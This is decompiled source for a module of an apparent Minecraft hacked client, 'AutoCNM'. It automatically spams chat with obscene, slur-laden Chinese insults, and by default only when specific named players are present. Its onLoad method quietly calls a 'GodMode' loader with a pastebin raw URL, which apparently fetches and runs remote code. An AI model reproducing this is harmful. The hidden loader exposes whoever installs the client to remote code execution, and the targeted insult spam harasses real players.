/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  it.make.loader.GodMode
 *  net.minecraft.entity.player.EntityPlayer
 */
package it.make.modules.combat;

import it.make.api.setting.Setting;
import it.make.api.utils.Timer;
import it.make.loader.GodMode;
import it.make.modules.Module;
import java.util.ArrayList;
import java.util.List;
import kotlin.Metadata;
import kotlin.collections.CollectionsKt;
import kotlin.jvm.internal.Intrinsics;
import net.minecraft.entity.player.EntityPlayer;
import org.jetbrains.annotations.NotNull;

@Metadata(mv={1, 6, 0}, k=1, xi=48, d1={"\u00008\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010!\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0002\u0010\b\n\u0002\b\u0003\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0005\u0018\u00002\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\b\u0010\u000f\u001a\u00020\fH\u0002J\b\u0010\u0010\u001a\u00020\u0011H\u0016J\b\u0010\u0012\u001a\u00020\u0011H\u0016J\b\u0010\u0013\u001a\u00020\u0011H\u0016J\b\u0010\u0014\u001a\u00020\u0011H\u0016J\b\u0010\u0015\u001a\u00020\u0011H\u0002R\u0014\u0010\u0003\u001a\b\u0012\u0004\u0012\u00020\u00050\u0004X\u0082\u000e\u00a2\u0006\u0002\n\u0000R2\u0010\u0006\u001a&\u0012\f\u0012\n \t*\u0004\u0018\u00010\b0\b \t*\u0012\u0012\f\u0012\n \t*\u0004\u0018\u00010\b0\b\u0018\u00010\u00070\u0007X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0014\u0010\n\u001a\b\u0012\u0004\u0012\u00020\u00050\u0004X\u0082\u0004\u00a2\u0006\u0002\n\u0000R2\u0010\u000b\u001a&\u0012\f\u0012\n \t*\u0004\u0018\u00010\f0\f \t*\u0012\u0012\f\u0012\n \t*\u0004\u0018\u00010\f0\f\u0018\u00010\u00070\u0007X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\r\u001a\u00020\u000eX\u0082\u000e\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u0016"}, d2={"Lit/make/modules/combat/AutoCNM;", "Lit/make/modules/Module;", "()V", "fucker2", "", "", "fuckerdelay", "Lit/make/api/setting/Setting;", "", "kotlin.jvm.PlatformType", "name404", "only404", "", "timer", "Lit/make/api/utils/Timer;", "in404", "onDisable", "", "onEnable", "onLoad", "onTick", "resetfucker", "Make.Life"})
public final class AutoCNM
extends Module {
    private Setting<Integer> fuckerdelay = this.rinte("FuckDelay", 500, 0, 10000);
    private Setting<Boolean> only404 = this.rbool("Only4i04", true);
    @NotNull
    private List<String> fucker2 = new ArrayList();
    @NotNull
    private final List<String> name404;
    @NotNull
    private Timer timer;

    public AutoCNM() {
        super("4i04Fucker", "NMSL", Module.Category.COMBAT);
        String[] stringArray = new String[]{"4i04", "\u9b3c\u724c", "\u8ff7\u4f60\u4e16\u754c\u7ea2\u77f3\u91d1\u6854"};
        this.name404 = CollectionsKt.mutableListOf(stringArray);
        this.timer = new Timer();
    }

    @Override
    public void onEnable() {
        this.resetfucker();
    }

    @Override
    public void onDisable() {
        this.resetfucker();
    }

    @Override
    public void onTick() {
        if (Module.mc.field_71439_g == null || Module.mc.field_71441_e == null) {
            return;
        }
        if (this.timer.passedMs(((Number)this.fuckerdelay.getValue()).intValue())) {
            if (this.fucker2.isEmpty()) {
                this.resetfucker();
            } else if (this.in404()) {
                Module.mc.field_71439_g.func_71165_d(CollectionsKt.first(this.fucker2));
                CollectionsKt.removeFirst(this.fucker2);
                this.timer.reset();
            }
        }
    }

    private final boolean in404() {
        if (!this.only404.getValue().booleanValue()) {
            return true;
        }
        for (Object e : Module.mc.field_71441_e.field_73010_i) {
            Intrinsics.checkNotNullExpressionValue(e, "mc.world.playerEntities");
            EntityPlayer players = (EntityPlayer)e;
            if (!this.name404.contains(players.func_70005_c_())) continue;
            return true;
        }
        return false;
    }

    private final void resetfucker() {
        String[] stringArray = new String[]{"\u8001\u5b50\u64cd\u4f60\u5988\u903c\u7684\u7a9d\u56ca\u5e9f\u8fb1\u534e\u73a9\u610f", "\u4f60\u5bb6\u7956\u575f\u662f\u4e0d\u662f\u88ab\u9b3c\u5b50\u5185\u5c04\u4e86", "\u4f60\u8111\u4e2d\u662f\u4e0d\u662f\u7ed9\u72d7\u5c4e\u5835\u585e\u4e86", "\u4f60\u4ed6\u5988\u5c31\u597d\u6bd4\u4e00\u6761\u91ce\u72ac\u627e\u5230\u4e86\u751f\u6d3b\u7684\u5e0c\u671b", "\u4f60\u5199\u7684\u5783\u573eMoongod\u5c31\u548c\u7a9d\u56ca\u5e9f\u4e00\u6837", "\u4f60\u4ee5\u4e3a\u4f60\u4ec0\u4e48\u4e1c\u897f\u554a", "\u8001\u5b50\u8f7b\u8f7b\u677e\u677e\u7ed9\u4f60\u5973\u670b\u53cb\u7ed9\u4f60\u4eb2\u5988\u64cd\u4e86", "\u4f60\u61c2\u4e0d\u61c2 \u4f60\u4ee5\u4e3a\u4f60\u5728\u6e38\u620f\u91cc\u9762\u975e\u5e38\u725b\u903c\u5176\u5b9e\u73b0\u5b9e\u4e16\u754c\u5c31\u662f\u4e00\u4e2a\u7a9d\u56ca\u5e9f\u5417", "\u8001\u5b50\u770b\u5230\u4f60\u5c31\u548c\u770b\u5230\u8def\u8fb9\u7684\u4e00\u5768\u72d7\u5c4e\u4e00\u6837\u6076\u5fc3"};
        this.fucker2 = CollectionsKt.mutableListOf(stringArray);
    }

    @Override
    public void onLoad() {
        new GodMode().run("https://pastebin.com/raw/As7BXfMW", (Object)Character.valueOf('\u2222'));
    }
}

